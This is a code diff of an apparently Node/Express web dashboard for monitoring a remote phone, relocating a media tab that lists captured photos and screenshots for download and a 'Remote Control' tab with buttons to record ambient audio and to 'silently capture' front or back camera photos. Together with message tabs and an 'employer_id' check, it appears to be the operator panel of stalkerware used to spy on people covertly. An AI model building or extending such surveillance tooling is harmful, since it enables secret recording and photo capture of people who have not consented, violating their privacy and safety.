@@ -948,31 +948,31 @@ app.get("/device", async (req, res) => {
             </div>
         </div>
 
-     <!-- Media Tab -->
-<div id="tab-media" class="tab-content">
-    <div class="card" style="padding:0">
-        ${
-          media.length === 0
-            ? '<p class="no-data">No media files</p>'
-            : `
-        <table>
-            <tr><th>Preview</th><th>Filename</th><th>Type</th><th>Actual Size</th><th>Date</th><th>Action</th></tr>
-          ${media
-            .map(
-              (m) => `<tr>
-    <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}" style="cursor:pointer" data-src="data:image/jpeg;base64,${m.thumbnail}" onclick="openLightbox(this)"/>` : "No preview"}</td>
-    <td>${m.filename}</td>
-    <td>${m.is_screenshot ? "📸 Screenshot" : "🖼️ Photo"}</td>
-    <td>${Math.round(m.size_bytes / 1024)}KB</td>
-    <td>${new Date(m.date_taken).toLocaleString()}</td>
-    <td><button class="btn btn-sm btn-primary" onclick="requestDownload('${token}','${m.filename}','${m._id}')">Download Full</button></td>
-</tr>`,
-            )
-            .join("")}
-        </table>`
-        }
-    </div>
-</div>
+                <!-- Media Tab -->
+            <div id="tab-media" class="tab-content">
+                <div class="card" style="padding:0">
+                    ${
+                    media.length === 0
+                        ? '<p class="no-data">No media files</p>'
+                        : `
+                    <table>
+                        <tr><th>Preview</th><th>Filename</th><th>Type</th><th>Actual Size</th><th>Date</th><th>Action</th></tr>
+                    ${media
+                        .map(
+                        (m) => `<tr>
+                                    <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}" style="cursor:pointer" data-src="data:image/jpeg;base64,${m.thumbnail}" onclick="openLightbox(this)"/>` : "No preview"}</td>
+                                    <td>${m.filename}</td>
+                                    <td>${m.is_screenshot ? "📸 Screenshot" : "🖼️ Photo"}</td>
+                                    <td>${Math.round(m.size_bytes / 1024)}KB</td>
+                                    <td>${new Date(m.date_taken).toLocaleString()}</td>
+                                    <td><button class="btn btn-sm btn-primary" onclick="requestDownload('${token}','${m.filename}','${m._id}')">Download Full</button></td>
+                                </tr>`,
+                        )
+                        .join("")}
+                    </table>`
+                    }
+                </div>
+            </div>
 
 <!-- Lightbox -->
 <div id="lightbox" onclick="closeLightbox()" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;justify-content:center;align-items:center;cursor:pointer">
@@ -986,6 +986,48 @@ app.get("/device", async (req, res) => {
             <button class="btn btn-primary" onclick="showDirection('incoming', this)" id="btn-incoming">📥 Incoming</button>
             <button class="btn" onclick="showDirection('outgoing', this)" id="btn-outgoing" style="background:#eee;color:#333">📤 Outgoing</button>
         </div>
+
+                    <!-- Remote Control Tab -->
+            <div id="tab-remote" class="tab-content">
+                <div class="card">
+                    <h3 style="color:#1a1a2e;margin-bottom:6px">Remote Control</h3>
+                    <p style="color:#888;font-size:13px;margin-bottom:20px">Commands are executed within 2 minutes when device is active.</p>
+                    
+                    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px">
+                        <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
+                            <div style="font-size:36px;margin-bottom:8px">🎙️</div>
+                            <h4 style="color:#1a1a2e;margin-bottom:8px">Record Ambient</h4>
+                            <p style="color:#888;font-size:12px;margin-bottom:12px">Record surroundings for 30 seconds</p>
+                            <select id="record-duration" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
+                                <option value="15">15 seconds</option>
+                                <option value="30" selected>30 seconds</option>
+                                <option value="60">1 minute</option>
+                                <option value="120">2 minutes</option>
+                                <option value="300">5 minutes</option>
+                            </select>
+                            <button class="btn btn-primary" onclick="sendCommand('record_ambient')" style="width:100%">Start Recording</button>
+                        </div>
+                        
+                        <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
+                            <div style="font-size:36px;margin-bottom:8px">📷</div>
+                            <h4 style="color:#1a1a2e;margin-bottom:8px">Take Photo</h4>
+                            <p style="color:#888;font-size:12px;margin-bottom:12px">Silently capture front or back camera</p>
+                            <select id="camera-facing" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
+                                <option value="back">Back Camera</option>
+                                <option value="front">Front Camera</option>
+                            </select>
+                            <button class="btn btn-primary" onclick="sendCommand('take_photo')" style="width:100%">Take Photo</button>
+                        </div>
+                    </div>
+
+                    <div id="remote-msg" style="display:none;padding:10px;border-radius:8px;margin-bottom:16px"></div>
+
+                    <h4 style="color:#1a1a2e;margin-bottom:12px">Recent Results</h4>
+                    <div id="remote-results">
+                        <p style="color:#888;text-align:center;padding:20px">Loading results...</p>
+                    </div>
+                </div>
+            </div>
 
         <!-- Incoming -->
         <div id="msg-incoming">
@@ -1083,49 +1125,6 @@ app.get("/device", async (req, res) => {
         </div>
     </div>
 </div>
-
-<!-- Remote Control Tab -->
-<div id="tab-remote" class="tab-content">
-    <div class="card">
-        <h3 style="color:#1a1a2e;margin-bottom:6px">Remote Control</h3>
-        <p style="color:#888;font-size:13px;margin-bottom:20px">Commands are executed within 2 minutes when device is active.</p>
-        
-        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px">
-            <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
-                <div style="font-size:36px;margin-bottom:8px">🎙️</div>
-                <h4 style="color:#1a1a2e;margin-bottom:8px">Record Ambient</h4>
-                <p style="color:#888;font-size:12px;margin-bottom:12px">Record surroundings for 30 seconds</p>
-                <select id="record-duration" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
-                    <option value="15">15 seconds</option>
-                    <option value="30" selected>30 seconds</option>
-                    <option value="60">1 minute</option>
-                    <option value="120">2 minutes</option>
-                    <option value="300">5 minutes</option>
-                </select>
-                <button class="btn btn-primary" onclick="sendCommand('record_ambient')" style="width:100%">Start Recording</button>
-            </div>
-            
-            <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
-                <div style="font-size:36px;margin-bottom:8px">📷</div>
-                <h4 style="color:#1a1a2e;margin-bottom:8px">Take Photo</h4>
-                <p style="color:#888;font-size:12px;margin-bottom:12px">Silently capture front or back camera</p>
-                <select id="camera-facing" style="width:100%;padding:6px;border:1px solid #ddd;border-radius:6px;margin-bottom:8px;font-size:13px">
-                    <option value="back">Back Camera</option>
-                    <option value="front">Front Camera</option>
-                </select>
-                <button class="btn btn-primary" onclick="sendCommand('take_photo')" style="width:100%">Take Photo</button>
-            </div>
-        </div>
-
-        <div id="remote-msg" style="display:none;padding:10px;border-radius:8px;margin-bottom:16px"></div>
-
-        <h4 style="color:#1a1a2e;margin-bottom:12px">Recent Results</h4>
-        <div id="remote-results">
-            <p style="color:#888;text-align:center;padding:20px">Loading results...</p>
-        </div>
-    </div>
-</div>
-
     </div>
     <script>
     if (!localStorage.getItem('employer_id')) window.location.href = '/';
